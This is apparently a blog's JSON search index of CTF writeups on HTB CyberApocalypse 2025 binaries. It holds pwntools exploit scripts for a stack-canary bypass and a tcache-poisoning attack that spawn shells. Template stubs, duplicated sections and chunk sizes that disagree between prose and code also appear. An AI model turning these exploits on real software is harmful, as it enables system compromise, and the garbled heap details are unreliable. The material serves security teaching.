[
  {
    "objectID": "index.html",
    "href": "index.html",
    "title": "Home",
    "section": "",
    "text": "I‚Äôm a student at Brno University of Technology, and I like cybersecurity üïµÔ∏è."
  },
  {
    "objectID": "index.html#ctf-writeups",
    "href": "index.html#ctf-writeups",
    "title": "Home",
    "section": "CTF writeups üö©",
    "text": "CTF writeups üö©\nHere are some of my CTF solutions and writeups üî•‚úçÔ∏è:\n- webhacking.kr\n- picoCTF\n- pwnable.kr\n- LACTF 2025\nFor detailed walkthroughs and explanations of my favourite challenges, check out my projects where I dive deeper into interesting techniques and solutions."
  },
  {
    "objectID": "index.html#connect-with-me",
    "href": "index.html#connect-with-me",
    "title": "Home",
    "section": "Connect with Me",
    "text": "Connect with Me\n\nüåê GitHub Profile\nüíº LinkedIn Profile\nüìß Email: olexa.matej@gmail.com\n\n\nThanks for stopping by! üöÄ"
  },
  {
    "objectID": "about.html",
    "href": "about.html",
    "title": "About",
    "section": "",
    "text": "About this site"
  },
  {
    "objectID": "blogs/index.html",
    "href": "blogs/index.html",
    "title": "Blog",
    "section": "",
    "text": "Order By\n       Default\n         \n          Title\n        \n         \n          Date - Oldest\n        \n         \n          Date - Newest\n        \n         \n          Author\n        \n     \n  \n    \n      \n      \n    \n\n\n\n\n\n\n\n\n\n\nHTB CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries\n\n\n\n\n\n\npwn\n\n\ncyberapocalypse2025\n\n\nstack\n\n\n\nDetailed analysis of the HTB CyberApocalypse 2025 ‚ÄòContractor‚Äô pwn challenge, demonstrating a technique to bypass stack canaries by corrupting a stack pointer during an overflow.\n\n\n\n\n\nMay 1, 2025\n\n\n\n\n\n\n\n\n\n\n\n\nHTB CyberApocalypse 2025 - Strategist: Heap Exploitation via Off-by-One and Tcache Poisoning\n\n\n\n\n\n\npwn\n\n\ncyberapocalypse2025\n\n\nheap\n\n\n\nDetailed analysis of the HTB CyberApocalypse 2025 ‚ÄòStrategist‚Äô pwn challenge, demonstrating an off-by-one heap overflow leading to Tcache poisoning and code execution.\n\n\n\n\n\nMay 1, 2025\n\n\n\n\n\n\nNo matching items"
  },
  {
    "objectID": "blogs/my-first-post.html",
    "href": "blogs/my-first-post.html",
    "title": "CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "",
    "text": "Stack buffer overflows are a classic vulnerability class, but modern defenses like Stack Canaries, NX, and PIE complicate exploitation. Standard overflows that overwrite the return address often corrupt the canary, causing the program to terminate. This post analyzes a specific binary (contractor) from the Hack The Box CyberApocalypse 2025 CTF that demonstrates an interesting technique to bypass stack canaries by corrupting a stack-based pointer during the overflow, redirecting subsequent writes to bypass the canary and overwrite the return address."
  },
  {
    "objectID": "blogs/my-first-post.html#introduction",
    "href": "blogs/my-first-post.html#introduction",
    "title": "CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "",
    "text": "Stack buffer overflows are a classic vulnerability class, but modern defenses like Stack Canaries, NX, and PIE complicate exploitation. Standard overflows that overwrite the return address often corrupt the canary, causing the program to terminate. This post analyzes a specific binary (contractor) from the Hack The Box CyberApocalypse 2025 CTF that demonstrates an interesting technique to bypass stack canaries by corrupting a stack-based pointer during the overflow, redirecting subsequent writes to bypass the canary and overwrite the return address."
  },
  {
    "objectID": "blogs/my-first-post.html#main-content",
    "href": "blogs/my-first-post.html#main-content",
    "title": "My First Blog Post",
    "section": "Main Content",
    "text": "Main Content\nYou can add code snippets:\ndef hello_world():\n    print(\"Hello, world!\")\nAdd images, links, and anything else you might need in a typical blog post."
  },
  {
    "objectID": "blogs/my-first-post.html#conclusion",
    "href": "blogs/my-first-post.html#conclusion",
    "title": "CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "Conclusion",
    "text": "Conclusion\nThis analysis demonstrated a practical technique for bypassing stack canaries without needing to leak the canary value itself. By carefully overflowing a buffer to corrupt a stack-based pointer used in subsequent write operations within the same vulnerable function, control flow hijacking can be achieved despite the canary protection. This highlights the importance of understanding not just the presence of mitigations, but the specific low-level mechanisms through which vulnerabilities can interact with them."
  },
  {
    "objectID": "blogs/my-first-post.html#blog-post-2-strategist-heap-exploitation",
    "href": "blogs/my-first-post.html#blog-post-2-strategist-heap-exploitation",
    "title": "My First Blog Post",
    "section": "",
    "text": "# CyberApocalypse CTF Writeup: Tcache Poisoning in 'Strategist'\n\nWelcome to part two of our CyberApocalypse CTF writeup series! This post dives into the `strategist` challenge, a heap exploitation problem. We'll explore how an off-by-one vulnerability can be leveraged to corrupt heap metadata, leading to a Tcache poisoning attack to gain arbitrary code execution.\n\nIf you missed part one covering stack exploitation in the 'Contractor' challenge, you can find it [here](link-to-contractor-post.md). ## Challenge Overview: Strategist\n\nThe `strategist` challenge provides a binary and remote access, with the following premise:\n\n&gt; \"To move forward, Sir Alaric requests each member of his team to present their most effective planning strategy. The individual with the strongest plan will be appointed as the Strategist for the upcoming war. Put forth your best effort to claim the role of Strategist!\"\n\nThe program allows managing \"plans\" via typical heap operations. Let's look at the protections:\n\n```text\n[*] './strategist'\nArch:       amd64-64-little\nRELRO:      Full RELRO\nStack:      Canary found\nNX:         NX enabled\nPIE:        PIE enabled\nRUNPATH:    b'./glibc/'\nStripped:   No\nAgain, we have PIE, NX, and Full RELRO. This time, the focus shifts from the stack to the heap. The goal will likely involve leaking a libc address and manipulating heap metadata to gain control, probably by overwriting a function pointer like __free_hook."
  },
  {
    "objectID": "blogs/my-first-post.html#initial-analysis-interaction",
    "href": "blogs/my-first-post.html#initial-analysis-interaction",
    "title": "My First Blog Post",
    "section": "Initial Analysis & Interaction",
    "text": "Initial Analysis & Interaction\nThe program presents a menu to create, show, edit, and delete plans.\n1. Create Plan\n2. Show Plan\n3. Edit Plan\n4. Delete Plan\n5. Exit\n&gt;\nStatic analysis (e.g., with Binary Ninja) reveals that plans are stored using malloc, and user data is read into these allocated chunks. The edit_plan function is particularly interesting."
  },
  {
    "objectID": "blogs/my-first-post.html#vulnerability-off-by-one-heap-overflow",
    "href": "blogs/my-first-post.html#vulnerability-off-by-one-heap-overflow",
    "title": "My First Blog Post",
    "section": "Vulnerability: Off-by-One Heap Overflow",
    "text": "Vulnerability: Off-by-One Heap Overflow\nThe core vulnerability lies in the edit_plan function. When editing a plan, the program first uses strlen on the existing content of the chunk to determine how many bytes to read for the new content. It then uses read to get the new data.\n// Simplified C representation of the vulnerable edit logic\n// param_1 points to an array of plan pointers\n// local_14 is the index of the plan to edit\nuint64_t nbytes = strlen(*(char **)(param_1 + (long)local_14 * 8)); // Get length of CURRENT content\nread(0, *(void **)(param_1 + (long)local_14 * 8), nbytes); // Read EXACTLY nbytes\n// CRITICAL FLAW: read does not null-terminate!\nIf the existing content has length N, read will read exactly N bytes. If the input provided doesn‚Äôt contain a newline or null byte within those N bytes, the buffer will not be null-terminated. More importantly, read overwrites the existing N bytes and potentially the byte immediately following the buffer.\nHeap Metadata Corruption: Heap chunks allocated by glibc‚Äôs malloc have metadata stored just before the user data area. This metadata includes the size of the chunk and flags. An adjacent chunk in memory follows immediately after.\n   Chunk A (e.g., size 0x30)           Chunk B (e.g., size 0x30)\n+-------------------------+-----------+-------------------------+-----------+\n| Metadata (size=0x31)    | User Data | Metadata (size=0x31)    | User Data | ...\n+-------------------------+-----------+-------------------------+-----------+\n                          ^           ^\n                          | Users see | Target for overflow\n                          this pointer\nIf we edit Chunk A, providing 0x30 bytes of data (its full user capacity), the read call writes 0x30 bytes. If the libc version and alignment allow, this write can overwrite the Least Significant Byte (LSB) of Chunk B‚Äôs size field in its metadata.\nExample (gef output): Imagine Chunk B initially has size 0x31 (0x30 bytes user data + 1 flag bit).\nBefore Overflow (Editing Chunk A):\ngef&gt;  x/20xg &lt;address_of_chunk_A_data&gt;\n...\n0x...e6b0: &lt;Chunk A data&gt;          0x0000000000000031  &lt;-- Chunk B size metadata\n0x...e6c0: &lt;Chunk B data&gt;          &lt;Chunk B data&gt;\n...\nAfter Editing Chunk A with 0x30 ‚ÄôA‚Äôs (no null terminator):\ngef&gt;  x/20xg &lt;address_of_chunk_A_data&gt;\n...\n0x...e6b0: 0x4141414141414141      0x0000000000000041  &lt;-- Chunk B size LSB CORRUPTED (0x31 -&gt; 0x41 'A')!\n0x...e6c0: &lt;Chunk B data&gt;          &lt;Chunk B data&gt;\n...\nThis subtle off-by-one corrupts the adjacent chunk‚Äôs size field. If we choose our overwrite byte carefully (e.g., writing 0x30 - 1 bytes of padding followed by \\x91), we can change Chunk B‚Äôs size from 0x31 to 0x91. This has significant implications for how free handles the chunk later."
  },
  {
    "objectID": "blogs/my-first-post.html#heap-concepts-tcache-and-unsorted-bin",
    "href": "blogs/my-first-post.html#heap-concepts-tcache-and-unsorted-bin",
    "title": "My First Blog Post",
    "section": "Heap Concepts: Tcache and Unsorted Bin",
    "text": "Heap Concepts: Tcache and Unsorted Bin\nTo understand the exploit, we need to know about two glibc heap structures:\n\nTcache (Thread-Local Cache): Introduced in glibc 2.26 for performance. Each thread has a set of bins (singly-linked lists) for small, recently freed chunks (up to ~0x408 bytes). Each bin holds up to 7 chunks of a specific size. malloc checks Tcache first. Freed small chunks go here if the bin isn‚Äôt full. It uses the fd (forward) pointer within the freed chunk‚Äôs user data area to point to the next free chunk in the list (LIFO - Last-In, First-Out). Tcache has fewer security checks than older mechanisms, making it a prime target.\nUnsorted Bin: A central, doubly-linked list (using fd and bk pointers) acting as a temporary holding area for freed chunks that don‚Äôt fit Tcache criteria immediately (e.g., too large, Tcache bin full). Chunks in the unsorted bin might later be consolidated or moved to other bins. Crucially, when a chunk is in the unsorted bin, its fd and bk pointers often point into libc‚Äôs main_arena structure. Reading these pointers after the chunk (or part of it) is reallocated provides a leak of a libc address."
  },
  {
    "objectID": "blogs/my-first-post.html#exploitation-strategy-tcache-poisoning",
    "href": "blogs/my-first-post.html#exploitation-strategy-tcache-poisoning",
    "title": "My First Blog Post",
    "section": "Exploitation Strategy: Tcache Poisoning",
    "text": "Exploitation Strategy: Tcache Poisoning\nThe goal is to overwrite the __free_hook function pointer (a hook called whenever free is invoked) with the address of system. Then, freeing a chunk containing /bin/sh will execute system(\"/bin/sh\"). We use Tcache Poisoning combined with the off-by-one and an Unsorted Bin leak.\n\nLeak Libc Address (Unsorted Bin Attack):\n\nAllocate a large chunk (L) (e.g., size &gt; 0x410) so it doesn‚Äôt go into Tcache when freed.\nAllocate a small ‚Äúbarrier‚Äù chunk (Barrier) to prevent L from merging with the top chunk when freed.\nfree(L). L goes into the Unsorted Bin. Its fd pointer now points into main_arena (part of libc).\nAllocate a small chunk (S). malloc splits L to satisfy this request. The fd pointer (libc address) from L gets copied into the user data area of S.\nshow(S). Read the content of S to get the leaked libc address.\nCalculate libc base: libc_base = leaked_address - offset. The offset is specific to the libc version and can be found using GDB (e.g., info proc mappings, vmmap, then calculate offset from main_arena). Now we know the address of system, __free_hook, etc.\n\nHeap Setup for Tcache Poisoning:\n\nAllocate several small chunks to control the layout, ensuring sizes relevant for Tcache (e.g., 0x20, 0x30). Let‚Äôs say we allocate A(0x28), B(0x20), C(0x20), D(0x20). Fill them with recognizable patterns. Chunk C will eventually hold /bin/sh.\nTrigger the Off-by-One: edit(A) with 0x28 - 1 padding bytes + \\x91. This overflows into Chunk B‚Äôs metadata, changing its size from 0x21 to 0x91. The falsely large size prevents libc from trying to consolidate B with C if they were freed consecutively later, which would mess up our Tcache manipulation.\n\nTcache Manipulation & Poisoning:\n\nfree(A). A goes to Tcache[0x30].\nfree(C). C goes to Tcache[0x20]. Tcache[0x20]: C -&gt; NULL.\nfree(B). B goes to Tcache[0x20]. Tcache[0x20]: B -&gt; C -&gt; NULL. Note that free uses the original size (0x20) here, but the corrupted size (0x91) affects later checks.\nThe Poison: Allocate a chunk (P) large enough (e.g., 0x80) such that its memory location overlaps the original location of the freed Chunk B. Write a carefully crafted payload into P: [Padding] + p64(libc.symbols.__free_hook). The padding length must be calculated so that p64(...) overwrites the memory where B‚Äôs fd pointer used to be. This changes the fd pointer within the Tcache structure implicitly. Now, Tcache[0x20] effectively looks like: B(fd=&__free_hook) -&gt; C -&gt; NULL.\nAllocate a chunk X of size 0x20. malloc returns Chunk B (from the head of Tcache[0x20]).\nAllocate another chunk Y of size 0x20. malloc follows the poisoned fd pointer of B and returns the address of __free_hook!\n\nOverwrite __free_hook and Trigger:\n\nWe now have a chunk (Y) whose data pointer points directly to __free_hook.\nedit(Y). Write the address of system (calculated using the leaked libc base). This overwrites the value stored at __free_hook.\nfree(C). Remember Chunk C contains /bin/sh. When free(C) is called, __free_hook is invoked first. Since it now points to system, the program executes system(C), which is system(\"/bin/sh\").\n\nGet Shell!"
  },
  {
    "objectID": "blogs/my-first-post.html#exploit-code-snippet-pwntools---key-parts",
    "href": "blogs/my-first-post.html#exploit-code-snippet-pwntools---key-parts",
    "title": "Matej Olexa",
    "section": "Exploit Code Snippet (Pwntools - Key Parts)",
    "text": "Exploit Code Snippet (Pwntools - Key Parts)\n#!/usr/bin/python3\nfrom pwn import *\n\n# --- Setup (Connect, ELF/Libc info) ---\ncontext.arch = 'amd64'\ncontext.log_level = 'info'\ntarget = './strategist'\nlibc_path = './glibc/libc.so.6' # Adjust as needed\n# connection = remote(host, port)\nconnection = process(target, env={\"LD_PRELOAD\": libc_path})\nelf = ELF(target)\nlibc = ELF(libc_path)\n\n# --- Helper Functions (create, show, edit, delete) ---\n# ... (include helper functions as shown in previous response) ...\n\n# --- 1. Libc Leak ---\nlog.info(\"Performing Libc Leak via Unsorted Bin...\")\ncreate(0x418, b'L'*8)       # Idx 0: Large chunk\ncreate(0x18, b'Barrier'*2) # Idx 1: Barrier\ndelete(0)                  # Free Large -&gt; Unsorted Bin\ncreate(0x18, b'S'*8)       # Idx 0: Small chunk, gets leak\nleak_data = show(0).strip()\n# Extract leak (adjust index based on actual output)\nleaked_addr = u64(leak_data[len(b'S'*8):].ljust(8, b'\\x00'))\n# Calculate libc base (offset highly libc-version specific)\n# Example for libc 2.31 leaking main_arena+1104:\nlibc.address = leaked_addr - (libc.symbols['main_arena'] + 1104)\nlog.success(f\"Libc base: {hex(libc.address)}\")\nlog.info(f\"System @ {hex(libc.symbols.system)}\")\nlog.info(f\"__free_hook @ {hex(libc.symbols.__free_hook)}\")\n\n# --- 2. Heap Setup & Metadata Corruption ---\nlog.info(\"Setting up heap and triggering off-by-one...\")\ncreate(0x28, b'A'*0x28)       # Idx 1: Chunk A (size 0x30)\ncreate(0x18, b'/bin/sh\\x00') # Idx 2: Chunk B (size 0x20) - Target for /bin/sh\ncreate(0x28, b'C'*0x28)       # Idx 3: Chunk C (size 0x30)\ncreate(0x18, b'D'*0x18)       # Idx 4: Chunk D (size 0x20)\n# Trigger off-by-one by editing A (idx 1) to corrupt B's (idx 2) size\nedit(1, b'A' * 0x28 + b'\\x41') # Overwrite B's size LSB (0x21 -&gt; 0x41)\n\n# --- 3. Tcache Manipulation & Poisoning ---\nlog.info(\"Freeing chunks and poisoning Tcache...\")\ndelete(3) # Free C (idx 3) -&gt; Tcache[0x30]\ndelete(1) # Free A (idx 1) -&gt; Tcache[0x30]\ndelete(4) # Free D (idx 4) -&gt; Tcache[0x20]\ndelete(2) # Free B (idx 2) -&gt; Tcache[0x20] head (B-&gt;D)\n# Now Tcache[0x20]: B(fd=&D) -&gt; D -&gt; NULL\n\n# Poison Write: Allocate chunk P (idx 1) overlapping B's old location\ncreate(0x28, b'P'*0x18 + p64(libc.symbols.__free_hook)) # Overwrite B's fd\n# Now Tcache[0x20]: B(fd=&__free_hook) -&gt; D -&gt; NULL\n\nlog.info(\"Allocating to retrieve target address...\")\n# Allocate from Tcache[0x20] bin twice\ncreate(0x18, b'X'*8) # Idx 2: Gets original B chunk space\n# Second alloc follows poisoned fd, returns pointer to __free_hook\n# Overwrite __free_hook directly during this allocation\ncreate(0x18, p64(libc.symbols.system)) # Idx 3: Data written AT __free_hook\n\n# --- 4. Trigger Execution ---\nlog.info(\"Triggering __free_hook...\")\n# Free the chunk containing \"/bin/sh\". Find its current index.\n# After the frees and reallocs, the original \"/bin/sh\" chunk might be at a different index\n# or needs to be reallocated. Let's assume for simplicity it ended up at index 2 after the above.\n# Need to verify this index with debugger for a real case.\n# If original B (idx 2) was allocated again at step \"Idx 2: Gets original B chunk space\"\n# we need to allocate /bin/sh again somewhere else, or edit that chunk.\n# Let's re-allocate /bin/sh for clarity:\ncreate(0x18, b'/bin/sh\\x00') # Idx 4: Contains /bin/sh\ndelete(4) # Free the chunk containing /bin/sh -&gt; calls system(\"/bin/sh\")\n\n\n# --- 5. Interact ---\nlog.success(\"Shell popped?\")\nconnection.interactive()\nNote: Heap exploitation, especially involving Tcache, is highly sensitive to the libc version and the exact sequence of allocations/frees. The indices and offsets in the code snippet are illustrative and may need careful adjustment and debugging against the specific target environment."
  },
  {
    "objectID": "blogs/my-first-post.html#blog-post-1-exploiting-stack-pointer-corruption-to-bypass-canaries",
    "href": "blogs/my-first-post.html#blog-post-1-exploiting-stack-pointer-corruption-to-bypass-canaries",
    "title": "Matej Olexa",
    "section": "",
    "text": "# Exploiting Stack Pointer Corruption to Bypass Canaries\n\nStack buffer overflows are a classic vulnerability class, but modern defenses like Stack Canaries, NX, and PIE complicate exploitation. Standard overflows that overwrite the return address often corrupt the canary, causing the program to terminate. This post analyzes a specific binary (`contractor`) that demonstrates an interesting technique to bypass stack canaries by corrupting a stack-based pointer *during* the overflow, redirecting subsequent writes to bypass the canary and overwrite the return address.\n\nThis analysis focuses on stack vulnerabilities. For an example of heap exploitation, see the companion post on [Tcache Poisoning via Off-by-One](link-to-strategist-post.md). ## Binary Analysis Context\n\nThe subject of this analysis is a 64-bit ELF binary. Key security mitigations enabled are:\n\n```text\n[*] './contractor'\nArch:       amd64-64-little\nRELRO:      Full RELRO\nStack:      Canary found\nNX:         NX enabled\nPIE:        PIE enabled\nRUNPATH:    b'./glibc/'\nSHSTK:      Enabled\nIBT:        Enabled\nStripped:   No\nThe binary takes user details (name, reason, age, specialty) and allows editing them. The core vulnerabilities lie in how the ‚Äòspecialty‚Äô field is handled. A function named contract exists, which simply calls execl(\"/bin/sh\", \"sh\", 0), making it an ideal target for control flow hijacking.\nint64_t contract() {\n     // Simplified - includes canary check logic before/after execl\n     execl(\"/bin/sh\", \"sh\", 0); // The goal\n     // ... canary check failure calls __stack_chk_fail() ...\n}"
  },
  {
    "objectID": "blogs/my-first-post.html#vulnerability-1-information-leak-via-unterminated-string-read",
    "href": "blogs/my-first-post.html#vulnerability-1-information-leak-via-unterminated-string-read",
    "title": "CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "Vulnerability 1: Information Leak via Unterminated String Read",
    "text": "Vulnerability 1: Information Leak via Unterminated String Read\nThe initial input routine for the specialty field reads up to 16 bytes. If exactly 16 bytes are provided without a newline, the resulting buffer on the stack is not null-terminated.\n// Simplified C representation of the initial input loop\nchar specialty_buffer[16];\n// ... read loop filling specialty_buffer ...\n// FLAW: No null terminator added if 16 bytes read without newline\nLater, when the program prints a summary using standard output functions (printf, puts), these functions read beyond the specialty_buffer looking for a null terminator. Debugging reveals a pointer to the binary‚Äôs .text segment resides on the stack immediately after this buffer. This pointer is leaked to the output.\nBypassing PIE: This leak defeats Position Independent Executable (PIE) randomization. By subtracting the known static offset of the leaked address (found via static analysis) from the leaked runtime address, we can calculate the binary‚Äôs base address at runtime. This allows determining the runtime addresses of required functions (like contract) and ROP gadgets. Runtime Base = Leaked Address - Static Offset"
  },
  {
    "objectID": "blogs/my-first-post.html#vulnerability-2-stack-buffer-overflow",
    "href": "blogs/my-first-post.html#vulnerability-2-stack-buffer-overflow",
    "title": "CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "Vulnerability 2: Stack Buffer Overflow",
    "text": "Vulnerability 2: Stack Buffer Overflow\nWhen editing the specialty field (option 4 in the program‚Äôs menu), a different input routine is used. This routine reads up to 256 bytes into the same 16-byte stack buffer region.\n// Simplified C representation of the EDIT specialty loop\n// ... reads up to 256 bytes via read() ...\n// Writes into the 16-byte specialty_buffer area on the stack\n*(uint8_t*)(stack_base_ptr + offset_to_specialty + i) = byte_read;\nThis provides a standard stack buffer overflow primitive, allowing us to write past the buffer towards higher stack addresses containing saved registers and the return address (RIP)."
  },
  {
    "objectID": "blogs/my-first-post.html#vulnerability-3-canary-bypass-via-stack-pointer-lsb-corruption",
    "href": "blogs/my-first-post.html#vulnerability-3-canary-bypass-via-stack-pointer-lsb-corruption",
    "title": "CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "Vulnerability 3: Canary Bypass via Stack Pointer LSB Corruption",
    "text": "Vulnerability 3: Canary Bypass via Stack Pointer LSB Corruption\nThe primary challenge is bypassing the stack canary located between the buffer and the saved RIP. The vulnerability lies in the specific stack layout and how the overflow write is performed.\nStack Layout:\n      +-------------------------+ High Address\n      | Saved RIP               | &lt;-- Target (Overwrite this)\n      +-------------------------+\n      | Stack Canary            | &lt;-- Obstacle (Do NOT overwrite this)\n      +-------------------------+\n      | Saved RBP               |\n      +-------------------------+\n      | Stack Ptr (*inf_ptr)    | &lt;-- Corruption Target (Pointer TO the struct)\n      +-------------------------+\n      | Binary Ptr (leaked)     |\n      +-------------------------+\n      | specialty_buffer (16B)  | &lt;-- Overflow Source\n      +-------------------------+\n      | Other local vars...     |\n      +-------------------------+ Low Address\nA pointer variable (inf_ptr), also stored on the stack, points to the beginning of the user information structure (which includes specialty). Crucially, inf_ptr is located after the specialty_buffer but before the canary. The vulnerable edit loop uses this inf_ptr to calculate the destination address for each byte it writes: *(inf_ptr + offset + loop_index) = input_byte;.\nThe Corruption Mechanism: 1. Begin the overflow payload, filling the specialty_buffer.\n2. Continue the payload until it reaches the memory location storing the inf_ptr variable.\n3. Overwrite only the Least Significant Byte (LSB) of the stored inf_ptr value with a specific byte (e.g., \\xcf). The exact byte depends on runtime stack alignment due to ASLR.\n4. The write loop immediately starts using this corrupted inf_ptr value to calculate the destination for the remaining bytes of the payload.\n5. The corrupted pointer effectively shifts the target write address higher up the stack, causing the rest of the payload (containing the desired RIP value and ROP gadgets) to land after the canary‚Äôs location, directly overwriting Saved RBP and Saved RIP.\nThe canary value itself remains untouched, bypassing the __stack_chk_fail check."
  },
  {
    "objectID": "blogs/my-first-post.html#exploitation-method",
    "href": "blogs/my-first-post.html#exploitation-method",
    "title": "CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "Exploitation Method",
    "text": "Exploitation Method\n\nLeak Address: Interact with the program, provide 16 bytes for specialty, parse the output to get the leaked binary pointer, and calculate the binary‚Äôs base address.\nTrigger Overflow: Select the option to edit the specialty field.\nCraft Payload: Construct the overflow buffer:\n\nPadding (e.g., b'A' * 32) to reach the inf_ptr LSB.\nCorruption byte (e.g., b'\\xcf'). Value determined by experimentation or calculation based on likely alignment.\nROP Chain (written via corrupted pointer):\n\np64(calculated_ret_gadget_addr): For stack alignment.\np64(calculated_contract_func_addr): Target function address.\n\n\nSend Payload: Send the crafted buffer and confirm the edit.\nRetry Logic: Enclose steps 2-4 in a loop. Since the correct corruption byte depends on stack ASLR alignment, the exploit may only succeed when the LSB aligns correctly with the chosen byte. The loop retries until successful exploitation.\nExecute Code: Upon success, RIP is overwritten with the contract function address (or a ROP chain leading to it), resulting in /bin/sh execution."
  },
  {
    "objectID": "blogs/my-first-post.html#exploit-code-snippet-pwntools",
    "href": "blogs/my-first-post.html#exploit-code-snippet-pwntools",
    "title": "CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "Exploit Code Snippet (Pwntools)",
    "text": "Exploit Code Snippet (Pwntools)\n#!/usr/bin/python3\nfrom pwn import *\n\n# --- Setup ---\ncontext.arch = 'amd64'\ncontext.log_level = 'critical'\ntarget = './contractor'\nelf = ELF(target)\n\n# --- Retry Loop ---\nattempt_count = 0\nwhile True:\n    attempt_count += 1\n    try:\n        connection = process(target) # Use process for local testing\n\n        # --- Initial Interaction ---\n        connection.sendlineafter(b'&gt; ', b'...') # Name\n        connection.sendlineafter(b'&gt; ', b'...') # Reason\n        connection.sendlineafter(b'&gt; ', b'...') # Age\n\n        # --- 1. Leak Address ---\n        leak_trigger = b'A' * 16\n        connection.sendlineafter(b'&gt; ', leak_trigger)\n        connection.recvuntil(leak_trigger)\n        leaked_bytes = connection.recvline().strip()\n        leaked_addr = u64(leaked_bytes.ljust(8, b'\\x00'))\n        elf.address = leaked_addr - 0x1b50 # Calculate base (Static offset = 0x1b50)\n        print(f'\\r[+] Attempt {attempt_count}: Base @ {hex(elf.address)}', end='', flush=True)\n\n        # --- 2. Trigger Overflow ---\n        connection.sendlineafter(b'&gt; ', b'4') # Select edit specialty\n\n        # --- 3. Craft Payload ---\n        payload = b'A' * 32          # Padding to inf_ptr LSB\n        payload += b'\\xcf'           # LSB corruption byte (requires luck/retry)\n        # ROP Chain (written via corrupted ptr)\n        payload += p64(elf.address + 0x101a) # ret gadget\n        payload += p64(elf.sym.contract)     # target function\n\n        # --- 4. Send Payload ---\n        connection.sendlineafter(b': ', payload)\n        connection.sendlineafter(b'&gt; ', b'Yes')\n\n        # --- 5. Check for Success ---\n        connection.sendline(b'echo SUCCESS')\n        result = connection.recvline_contains(b'SUCCESS', timeout=0.2)\n\n        if b'SUCCESS' in result:\n            print(f'\\n\\n[!] Success on attempt {attempt_count}!')\n            connection.interactive() # Get shell\n            break\n        connection.close()\n\n    except EOFError:\n        connection.close()\n    except Exception:\n        connection.close()"
  },
  {
    "objectID": "blogs/my-first-post.html#vulnerability-off-by-one-heap-overflow---metadata-corruption",
    "href": "blogs/my-first-post.html#vulnerability-off-by-one-heap-overflow---metadata-corruption",
    "title": "Matej Olexa",
    "section": "Vulnerability: Off-by-One Heap Overflow -> Metadata Corruption",
    "text": "Vulnerability: Off-by-One Heap Overflow -&gt; Metadata Corruption\nThe edit_plan function determines the number of bytes to read based on the strlen of the current content of the target chunk. It then reads exactly that many bytes using read.\n// Simplified C representation of vulnerable edit logic\nuint64_t current_len = strlen(plan_chunk-&gt;data);\nread(0, plan_chunk-&gt;data, current_len); // Reads exactly current_len bytes\n// FLAW: read() doesn't null-terminate. If current_len equals the\n//       chunk's user data capacity, this overwrites the byte\n//       immediately following the buffer.\nIn glibc‚Äôs heap implementation (ptmalloc), metadata (including the chunk size) is stored immediately before the user data, and chunks are often laid out contiguously in memory. The byte immediately following Chunk A‚Äôs user data buffer is often the Least Significant Byte (LSB) of Chunk B‚Äôs size field in its metadata header.\n   Chunk A (e.g., size 0x30)           Chunk B (e.g., size 0x30)\n+-----------+---------------+-----------+----------------+---------------+\n| A Hdr S=31| A User Data   | B Hdr S=31| B User Data    | C Hdr S=...   | ...\n+-----------+---------------+-----------+----------------+---------------+\n            ^               ^           ^\n            | User Ptr A    |           | User Ptr B\n                            |\n                            +-- Off-by-one write from editing A hits here (LSB of B's size)\nBy controlling the content written into Chunk A during an edit operation where current_len equals A‚Äôs capacity, we can overwrite the LSB of Chunk B‚Äôs size field. For example, writing 0x30 bytes ending in \\x91 could change Chunk B‚Äôs size from 0x21 (if it was a 0x18 byte user chunk) to 0x91. This corruption is key, as it can bypass sanity checks later, particularly during free."
  },
  {
    "objectID": "blogs/my-first-post.html#heap-concepts-for-exploitation",
    "href": "blogs/my-first-post.html#heap-concepts-for-exploitation",
    "title": "Matej Olexa",
    "section": "Heap Concepts for Exploitation",
    "text": "Heap Concepts for Exploitation\nUnderstanding glibc heap internals is crucial:\n\nTcache (Thread-Local Cache): A per-thread cache for recently freed small chunks (&lt;= 0x408 bytes). Organized as several singly-linked lists (bins), one for each chunk size. Uses the fd pointer within the freed chunk‚Äôs user data area to point to the next free chunk in its bin (LIFO). malloc checks Tcache first for performance. Tcache has fewer security checks than older bins, making it susceptible to attacks like double-free and poisoning.\nUnsorted Bin: A global doubly-linked list (fd and bk pointers) acting as a temporary holding place for freed chunks too large for Tcache or when Tcache bins are full. Chunks here have their fd and bk pointers pointing into libc‚Äôs main_arena. If we can read the contents of a chunk after it has been in the unsorted bin and then partially reallocated, we can leak these libc pointers.\nTcache Poisoning: An attack technique where a vulnerability (like use-after-free, double-free, or the off-by-one here) is used to overwrite the fd pointer of a chunk currently sitting in a Tcache bin. By making the fd pointer point to an arbitrary target address (e.g., __free_hook), the next malloc request for that chunk size will return a pointer to the target address, allowing the attacker to write to it."
  },
  {
    "objectID": "blogs/my-first-post.html#exploitation-method-tcache-poisoning",
    "href": "blogs/my-first-post.html#exploitation-method-tcache-poisoning",
    "title": "Matej Olexa",
    "section": "Exploitation Method (Tcache Poisoning)",
